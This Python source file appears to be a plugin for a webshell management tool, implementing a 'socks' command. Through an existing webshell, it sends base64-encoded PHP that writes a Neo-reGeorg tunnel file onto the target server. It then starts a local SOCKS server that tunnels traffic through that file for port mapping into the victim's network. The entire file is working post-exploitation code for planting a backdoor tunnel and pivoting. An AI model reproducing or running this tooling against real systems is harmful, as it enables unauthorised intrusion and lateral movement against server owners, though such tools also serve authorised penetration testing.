from os import path
from re import match
from threading import Thread

from libs.config import alias, gget, color
from libs.myapp import send, base64_encode,  randstr, ALPATHNUMERIC
from auxiliary.neoreg.x import init, generate, connectTunnel


def default_input(msg, value):
    result = input("%s [%s]: " % (msg, value))
    return result if result else value


@alias(True, _type="OTHER", k="key", code="httpcode", dns="local_dns", t="threads", l="listen_on", p="listen_port")
def run(key: str = 'doughnuts', threads: int = 1000, listen_on: str = "127.0.0.1", listen_port: int = 1080, proxy: str = "", httpcode: int = 200, read_buff: int = 513, connect_read_buf: int = 7, max_read_size: int = 512, read_interval: int = 300, write_interval: int = 200, local_dns: bool = False):
    """
    socks

    (DEVELOP) (php >= 5.4.0) Start a socks server, upload and connect to the remote webshell tunnel for port mapping power by neo-regeorg.

    eg: socks {key='doughnuts'} {threads=1000} {listen_on='127.0.0.1'} {listen_port=1080} {proxy=current_proxy} {httpcode=200} {read_buff=513} {connect_read_buf=7} {max_read_size=512} {read_interval=300} {write_interval=200} {local_dns=False}
    """
    name = randstr(ALPATHNUMERIC, 8) + ".php"

    depr = gget("webshell.directory_separator", "webshell")
    scheme = gget("webshell.scheme", "webshell")
    netloc = gget("webshell.netloc", "webshell")
    http_root_path = "%s://%s/" % (scheme, netloc)
    web_root = gget("webshell.root", "webshell", "")
    webshell_root = gget("webshell.webshell_root", "webshell", ".")
    relpath = path.relpath(webshell_root + "/" + name, web_root).replace("\\", '/')
    current_proxy = gget('proxies')
    if not proxy and current_proxy:
        proxy = current_proxy

    tunnel_path = default_input("tunnel path", webshell_root + depr + name)
    http_path = default_input("http path", http_root_path + relpath)

    # init
    init(key)

    # generate
    tunnel_content = generate(httpcode, read_buff, max_read_size)

    res = send(
        f"print(file_put_contents(base64_decode('{base64_encode(tunnel_path)}'), base64_decode('{base64_encode(tunnel_content)}')));")
    if (not res):
        return
    text = res.r_text.strip()
    if (match(r"\d+", text)):
        print(color.green(f"\nWrite tunnel {tunnel_path} success"))
    else:
        print(color.red(f"\nWrite tunnel {tunnel_path} failed"))
        return

    # connect
    t = Thread(target=connectTunnel, args=(http_path, listen_on, listen_port,
               local_dns, connect_read_buf, read_interval, write_interval, threads, proxy))
    t.setDaemon(True)
    t.start()

    print(color.green(
        f"\nStart socks server on {listen_on}:{listen_port} success\n"))
